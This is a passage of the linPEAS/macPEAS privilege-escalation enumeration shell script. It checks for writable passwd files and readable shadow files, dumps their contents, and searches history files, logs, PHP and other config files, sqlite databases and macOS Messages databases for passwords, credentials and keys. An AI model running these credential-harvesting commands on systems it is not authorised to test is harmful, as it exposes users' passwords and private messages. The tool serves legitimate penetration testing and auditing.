  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then #Those folders don´t exist on a MacOS
    check_critial_root_path "/etc/init/"
    check_critial_root_path "/etc/init.d/"
    check_critial_root_path "/etc/rc.d/init.d"
    check_critial_root_path "/usr/local/etc/rc.d"
    check_critial_root_path "/etc/rc.d"
    check_critial_root_path "/etc/systemd/"
    check_critial_root_path "/lib/systemd/"
  fi

  echo ""
fi



##-- IPF) Hashes in passwd file
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_list "Hashes inside passwd file? ........... "
  if grep -qv '^[^:]*:[x\*\!]\|^#\|^$' /etc/passwd /etc/master.passwd /etc/group 2>/dev/null; then grep -v '^[^:]*:[x\*]\|^#\|^$' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  ##-- IPF) Writable in passwd file
  print_list "Writable passwd file? ................ "
  if [ -w "/etc/passwd" ]; then echo "/etc/passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ -w "/etc/pwd.db" ]; then echo "/etc/pwd.db is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ -w "/etc/master.passwd" ]; then echo "/etc/master.passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else echo_no
  fi

  ##-- IPF) Credentials in fstab
  print_list "Credentials in fstab/mtab? ........... "
  if grep -qE "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null; then grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  ##-- IPF) Read shadow files
  print_list "Can I read shadow files? ............. "
  if [ "$(cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null)" ]; then cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "Can I read shadow plists? ............ "
  possible_check=""
  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no

  print_list "Can I write shadow plists? ........... "
  possible_check=""
  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -w "$l" ];then echo "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no

  ##-- IPF) Read opasswd file
  print_list "Can I read opasswd file? ............. "
  if [ -r "/etc/security/opasswd" ]; then cat /etc/security/opasswd 2>/dev/null || echo ""
  else echo_no
  fi

  ##-- IPF) network-scripts
  print_list "Can I write in network-scripts? ...... "
  if ! [ "$IAMROOT" ] && [ -w "/etc/sysconfig/network-scripts/" ]; then echo "You have write privileges on /etc/sysconfig/network-scripts/" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ "$(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges on $(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else echo_no
  fi

  ##-- IPF) Read root dir
  print_list "Can I read root folder? .............. "
  (ls -al /root/ 2>/dev/null | grep -vi "total 0") || echo_no
  echo ""
fi

##-- IPF) Root files in home dirs
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching root files in home dirs (limit 30)"
  (find $HOMESEARCH -user root 2>/dev/null | head -n 30 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
  echo ""
fi

##-- IPF) Others files in my dirs
if ! [ "$IAMROOT" ]; then
  print_2title "Searching folders owned by me containing others files on it (limit 100)"
  (find $ROOT_FOLDER -type d -user "$USER" ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -n 100 | while read d; do find "$d" -maxdepth 1 ! -user "$USER" \( -type f -or -type d \) -exec ls -l {} \; 2>/dev/null; done) | sort | uniq | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed "s,root,${C}[1;13m&${C}[0m,g"
  echo ""
fi

##-- IPF) Readable files belonging to root and not world readable
if ! [ "$IAMROOT" ]; then
  print_2title "Readable files belonging to root and readable by me but not world readable"
  (find $ROOT_FOLDER -type f -user root ! -perm -o=r ! -path "/proc/*" 2>/dev/null | grep -v "\.journal" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null | sed -${E} "s,/.*,${SED_RED},"; fi; done) || echo_not_found
  echo ""
fi

##-- IPF) Interesting writable files by ownership or all
if ! [ "$IAMROOT" ]; then
  print_2title "Interesting writable files owned by me or writable by everyone (not in Home) (max 500)"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"
  # In the next file, you need to specify type "d" and "f" to avoid fake link files apparently writable by all
  obmowbe=$(find $ROOT_FOLDER '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | sort | uniq | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
  printf "%s\n" "$obmowbe" | while read entry; do
    if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
    elif echo "$entry" | grep -qE "$writeVB"; then
      echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
    else
      echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
    fi
  done
  echo ""
fi

##-- IPF) Interesting writable files by group
if ! [ "$IAMROOT" ]; then
  print_2title "Interesting GROUP writable files (not in Home) (max 500)"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"
  for g in $(groups); do
    iwfbg=$(find $ROOT_FOLDER '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
    if [ "$iwfbg" ] || [ "$DEBUG" ]; then
      printf "  Group $GREEN$g:\n$NC";
      printf "%s\n" "$iwfbg" | while read entry; do
        if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
        elif echo "$entry" | grep -Eq "$writeVB"; then
          echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
        else
          echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
        fi
      done
    fi
  done
  echo ""
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q interesting_files; then
print_title "Other Interesting Files"
###########################################
#----------) Interesting files (----------#
###########################################


##-- IF) .sh files in PATH
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title ".sh files in path"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path"
  echo $PATH | tr ":" "\n" | while read d; do
    for f in $(find "$d" -name "*.sh" -o -name "*.sh.*" 2>/dev/null); do
      if ! [ "$IAMROOT" ] && [ -O "$f" ]; then
        echo "You own the script: $f" | sed -${E} "s,.*,${SED_RED},"
      elif ! [ "$IAMROOT" ] && [ -w "$f" ]; then # If write permision, win found (no check exploits)
        echo "You can write script: $f" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      else
        echo $f | sed -${E} "s,$shscripsG,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED},";
      fi
    done
  done
  echo ""

  broken_links=$(find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken)
  if [ "$broken_links" ] || [ "$DEBUG" ]; then 
    print_2title "Broken links in path"
    echo $PATH | tr ":" "\n" | while read d; do
      find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken | sed -${E} "s,broken,${SED_RED},";
    done
    echo ""
  fi
fi

##-- IF) Date times inside firmware
if [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Files datetimes inside the firmware (limit 50)"
  find "$SEARCH_IN_FOLDER" -type f -printf "%T+\n" 2>/dev/null | sort | uniq -c | sort | head -n 50
  echo "To find a file with an specific date execute: find \"$SEARCH_IN_FOLDER\" -type f -printf \"%T+ %p\n\" 2>/dev/null | grep \"<date>\""
  echo ""
fi

##-- IF) Executable files added by user
print_2title "Executable files potentially added by user (limit 70)"
if ! [ "$SEARCH_IN_FOLDER" ]; then
  find / -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "000|/site-packages|/python|/node_modules|\.sample|/gems|/cgroup/" | sort -r | head -n 70
else
  find "$SEARCH_IN_FOLDER" -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "/site-packages|/python|/node_modules|\.sample|/gems|/cgroup/" | sort -r | head -n 70
fi
echo ""



if [ "$MACPEAS" ]; then
  print_2title "Unsigned Applications"
  macosNotSigned /System/Applications
fi

##-- IF) Unexpected in /opt
if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$(ls /opt 2>/dev/null)" ]; then
    print_2title "Unexpected in /opt (usually empty)"
    ls -la /opt
    echo ""
  fi
fi

##-- IF) Unexpected folders in /
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Unexpected in root"
  if [ "$MACPEAS" ]; then
    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsMacG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  else
    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  fi
  echo ""
fi

##-- IF) Modified interesting files into specific folders in the last 5mins
print_2title "Modified interesting files in the last 5mins (limit 100)"
find $ROOT_FOLDER -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" ! -path "/private/var/*" 2>/dev/null | grep -v "/linpeas" | head -n 100 | sed -${E} "s,$Wfolders,${SED_RED},"
echo ""

##-- IF) Writable log files
if command -v logrotate >/dev/null && logrotate --version | head -n 1 | grep -Eq "[012]\.[0-9]+\.|3\.[0-9]\.|3\.1[0-7]\.|3\.18\.0"; then # 3.18.0 and below
print_2title "Writable log files (logrotten) (limit 50)"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation"
  logrotate --version 2>/dev/null || echo_not_found "logrotate"
  lastWlogFolder="ImPOsSiBleeElastWlogFolder"
  logfind=$(find $ROOT_FOLDER -type f -name "*.log" -o -name "*.log.*" 2>/dev/null | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 3){ print line_init; }; if (cont == "3"){print "#)You_can_write_more_log_files_inside_last_directory"}; pre=act}' | head -n 50)
  printf "%s\n" "$logfind" | while read log; do
    if ! [ "$IAMROOT" ] && [ "$log" ] && [ -w "$log" ] || ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders"; then # Only print info if something interesting found
      if echo "$log" | grep -q "You_can_write_more_log_files_inside_last_directory"; then printf $ITALIC"$log\n"$NC;
      elif ! [ "$IAMROOT" ] && [ -w "$log" ] && [ "$(command -v logrotate 2>/dev/null)" ] && logrotate --version 2>&1 | grep -qE ' 1| 2| 3.1'; then printf "Writable:$RED $log\n"$NC; #Check vuln version of logrotate is used and print red in that case
      elif ! [ "$IAMROOT" ] && [ -w "$log" ]; then echo "Writable: $log";
      elif ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders" && [ "$log" ] && [ ! "$lastWlogFolder" == "$log" ]; then lastWlogFolder="$log"; echo "Writable folder: $log" | sed -${E} "s,$Wfolders,${SED_RED},g";
      fi
    fi
  done
fi

echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  ##-- IF) Files inside my home
  print_2title "Files inside $HOME (limit 20)"
  (ls -la $HOME 2>/dev/null | head -n 23) || echo_not_found
  echo ""

  ##-- IF) Files inside /home
  print_2title "Files inside others home (limit 20)"
  (find $HOMESEARCH -type f 2>/dev/null | grep -v -i "/"$USER | head -n 20) || echo_not_found
  echo ""

  ##-- IF) Mail applications
  print_2title "Searching installed mail applications"
  ls /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /etc 2>/dev/null | grep -Ewi "$mail_apps" | sort | uniq
  echo ""

  ##-- IF) Mails
  print_2title "Mails (limit 50)"
  (find /var/mail/ /var/spool/mail/ /private/var/mail -type f -ls 2>/dev/null | head -n 50 | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_GREEN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
  echo ""

  ##-- IF) Backup folders
  if [ "$backup_folders" ] || [ "$DEBUG" ]; then
    print_2title "Backup folders"
    printf "%s\n" "$backup_folders" | while read b ; do
      ls -ld "$b" 2> /dev/null | sed -${E} "s,backups|backup,${SED_RED},g";
      ls -l "$b" 2>/dev/null && echo ""
    done
    echo ""
  fi
fi

##-- IF) Backup files
print_2title "Backup files (limited 100)"
backs=$(find $ROOT_FOLDER -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bak\.*" -o -name "*\.bck" -o -name "*\.bck\.*" -o -name "*\.bk" -o -name "*\.bk\.*" -o -name "*\.old" -o -name "*\.old\.*" \) -not -path "/proc/*" 2>/dev/null)
printf "%s\n" "$backs" | head -n 100 | while read b ; do
  if [ -r "$b" ]; then
    ls -l "$b" | grep -Ev "$notBackup" | grep -Ev "$notExtensions" | sed -${E} "s,backup|bck|\.bak|\.old,${SED_RED},g";
  fi;
done
echo ""

##-- IF) DB files
if [ "$MACPEAS" ]; then
  print_2title "Reading messages database"
  sqlite3 $HOME/Library/Messages/chat.db 'select * from message' 2>/dev/null
  sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment' 2>/dev/null
  sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages' 2>/dev/null

fi


if [ "$PSTORAGE_DATABASE" ] || [ "$DEBUG" ]; then
  print_2title "Searching tables inside readable .db/.sql/.sqlite files (limit 100)"
  FILECMD="$(command -v file 2>/dev/null)"
  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
    if [ "$FILECMD" ]; then
      echo "Found "$(file "$f") | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
    else
      echo "Found $f" | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
    fi
  done
  SQLITEPYTHON=""
  echo ""
  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
    if ([ -r "$f" ] && [ "$FILECMD" ] && file "$f" | grep -qi sqlite) || ([ -r "$f" ] && [ ! "$FILECMD" ]); then # If readable and filecmd and sqlite, or readable and not filecmd
      if [ "$(command -v sqlite3 2>/dev/null)" ]; then
        tables=$(sqlite3 $f ".tables" 2>/dev/null)
        #printf "$tables\n" | sed "s,user.*\|credential.*,${SED_RED},g"
      elif [ "$(command -v python 2>/dev/null)" ] || [ "$(command -v python3 2>/dev/null)" ]; then
        SQLITEPYTHON=$(command -v python 2>/dev/null || command -v python3 2>/dev/null)
        tables=$($SQLITEPYTHON -c "print('\n'.join([t[0] for t in __import__('sqlite3').connect('$f').cursor().execute('SELECT name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\';').fetchall()]))" 2>/dev/null)
        #printf "$tables\n" | sed "s,user.*\|credential.*,${SED_RED},g"
      else
        tables=""
      fi
      if [ "$tables" ] || [ "$DEBUG" ]; then
          printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
          printf "%s\n" "$tables" | while read t; do
          columns=""
          # Search for credentials inside the table using sqlite3
          if [ -z "$SQLITEPYTHON" ]; then
            columns=$(sqlite3 $f ".schema $t" 2>/dev/null | grep "CREATE TABLE")
          # Search for credentials inside the table using python
          else
            columns=$($SQLITEPYTHON -c "print(__import__('sqlite3').connect('$f').cursor().execute('SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'$t\';').fetchall()[0][0])" 2>/dev/null)
          fi
          # Check found columns for interesting fields
          INTCOLUMN=$(echo "$columns" | grep -i "username\|passw\|credential\|email\|hash\|salt")
          if [ "$INTCOLUMN" ]; then
            printf ${BLUE}"  --> Found interesting column names in$NC $t $DG(output limit 10)\n"$NC | sed -${E} "s,user.*|credential.*,${SED_RED},g"
            printf "$columns\n" | sed -${E} "s,username|passw|credential|email|hash|salt|$t,${SED_RED},g"
            (sqlite3 $f "select * from $t" || $SQLITEPYTHON -c "print(', '.join([str(x) for x in __import__('sqlite3').connect('$f').cursor().execute('SELECT * FROM \'$t\';').fetchall()[0]]))") 2>/dev/null | head
            echo ""
          fi
        done
      fi
    fi
  done
fi
echo ""

if [ "$MACPEAS" ]; then
  print_2title "Downloaded Files"
  sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'select LSQuarantineAgentName, LSQuarantineDataURLString, LSQuarantineOriginURLString, date(LSQuarantineTimeStamp + 978307200, "unixepoch") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp' | sort | grep -Ev "\|\|\|"
fi

##-- IF) Web files
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Web files?(output limit)"
  ls -alhR /var/www/ 2>/dev/null | head
  ls -alhR /srv/www/htdocs/ 2>/dev/null | head
  ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head
  ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head
  echo ""
fi

##-- IF) All hidden files
print_2title "All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)"
find $ROOT_FOLDER -type f -iname ".*" ! -path "/sys/*" ! -path "/System/*" ! -path "/private/var/*" -exec ls -l {} \; 2>/dev/null | grep -Ev "$INT_HIDDEN_FILES" | grep -Ev "_history$|\.gitignore|.npmignore|\.listing|\.ignore|\.uuid|\.depend|\.placeholder|\.gitkeep|\.keep|\.keepme|\.travis.yml" | head -n 70
echo ""

##-- IF) Readable files in /tmp, /var/tmp, backups
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)"
  filstmpback=$(find /tmp /var/tmp /private/tmp /private/var/at/tmp /private/var/tmp $backup_folders_row -type f 2>/dev/null | grep -Ev "dpkg\.statoverride\.|dpkg\.status\.|apt\.extended_states\.|dpkg\.diversions\." | head -n 70)
  printf "%s\n" "$filstmpback" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null; fi; done
  echo ""
fi

##-- IF) Passwords in history cmd
if [ "$(history 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in history cmd"
  history | grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  echo ""
fi

##-- IF) Passwords in history files
if [ "$PSTORAGE_HISTORY" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in history files"
  printf "%s\n" "$PSTORAGE_HISTORY" | while read f; do grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"; done
  echo ""
fi

##-- IF) Passwords in config PHP files
if [ "$PSTORAGE_PHP_FILES" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in config PHP files"
  printf "%s\n" "$PSTORAGE_PHP_FILES" | while read c; do grep -EiI "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" "$c" 2>/dev/null | grep -Ev "function|password.*= ?\"\"|password.*= ?''" | sed '/^.\{150\}./d' | sort | uniq | sed -${E} "s,[pP][aA][sS][sS][wW]|[dD][bB]_[pP][aA][sS][sS],${SED_RED},g"; done
  echo ""
fi

##-- IF) Passwords files in home
if [ "$PSTORAGE_PASSWORD_FILES" ] || [ "$DEBUG" ]; then
  print_2title "Searching *password* or *credential* files in home (limit 70)"
  (printf "%s\n" "$PSTORAGE_PASSWORD_FILES" | grep -v "/snap/" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; } if (cont == "3"){print "  #)There are more creds/passwds files in the previous parent folder\n"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 70 | sed -${E} "s,password|credential,${SED_RED}," | sed "s,There are more creds/passwds files in the previous parent folder,${C}[3m&${C}[0m,") || echo_not_found
  echo ""
fi

##-- IF) TTY passwords
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Checking for TTY (sudo/su) passwords in audit logs"
  aureport --tty 2>/dev/null | grep -E "su |sudo " | sed -${E} "s,su|sudo,${SED_RED},g"
  find /var/log/ -type f -exec grep -RE 'comm="su"|comm="sudo"' '{}' \; 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${SED_RED},g" | sed -${E} "s,data=.*,${SED_RED},g"
  echo ""
fi

##-- IF) IPs inside logs
if [ "$DEBUG" ] || ( ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$SEARCH_IN_FOLDER" ] ); then
  print_2title "Searching IPs inside logs (limit 70)"
  (find /var/log/ /var/logs /private/var/log -type f -exec grep -R -a -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" "{}" \;) 2>/dev/null | grep -v "\.0\.\|:0\|\.0$" | sort | uniq -c | sort -r -n | head -n 70
  echo ""
fi

##-- IF) Passwords inside logs
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching passwords inside logs (limit 70)"
  (find /var/log/ /var/logs/ /private/var/log -type f -exec grep -R -i "pwd\|passw" "{}" \;) 2>/dev/null | sed '/^.\{150\}./d' | sort | uniq | grep -v "File does not exist:\|modules-config/config-set-passwords\|config-set-passwords already ran\|script not found or unable to stat:\|\"GET /.*\" 404" | head -n 70 | sed -${E} "s,pwd|passw,${SED_RED},"
  echo ""
fi

if [ "$DEBUG" ] || ( ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$SEARCH_IN_FOLDER" ] ); then
  ##-- IF) Emails inside logs
  print_2title "Searching emails inside logs (limit 70)"
  (find /var/log/ /var/logs/ /private/var/log -type f -exec grep -I -R -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" "{}" \;) 2>/dev/null | sort | uniq -c | sort -r -n | head -n 70 | sed -${E} "s,$knw_emails,${SED_GREEN},g"
  echo ""
fi

if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  ##-- IF) Find possible files with passwords
  print_2title "Searching possible password variables inside key folders (limit 140)"
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    timeout 150 find $HOMESEARCH -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
    timeout 150 find /var/www $backup_folders_row /tmp /etc /mnt /private grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  else
    timeout 150 find $SEARCH_IN_FOLDER -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  fi
  wait
  echo ""

  ##-- IF) Find possible conf files with passwords
  print_2title "Searching possible password in config files (if k8s secrets are found you need to read the file)"
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    ppicf=$(timeout 150 find $HOMESEARCH /var/www/ /usr/local/www/ /etc /opt /tmp /private /Applications /mnt -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  else
    ppicf=$(timeout 150 find $SEARCH_IN_FOLDER -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  fi
  printf "%s\n" "$ppicf" | while read f; do
    if grep -qEiI 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' \"$f\" 2>/dev/null; then
      echo "$ITALIC $f$NC"
      grep -HnEiIo 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' "$f" 2>/dev/null | sed -${E} "s,[pP][aA][sS][sS][wW]|[cC][rR][eE][dD][eE][nN],${SED_RED},g"
    fi
  done
  echo ""
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q api_keys_regex; then
print_title "API Keys Regex"

search_for_regex(){
    title=$1
    regex=$2
    caseSensitive=$3
    
    if [ "$caseSensitive" ]; then
        i="i"
    else
        i=""
    fi

    print_3title_no_nl "Searching $title..."

    if [ "$SEARCH_IN_FOLDER" ]; then
        timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
    else
        # Search in home direcoties (usually the slowest)
        timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in etc
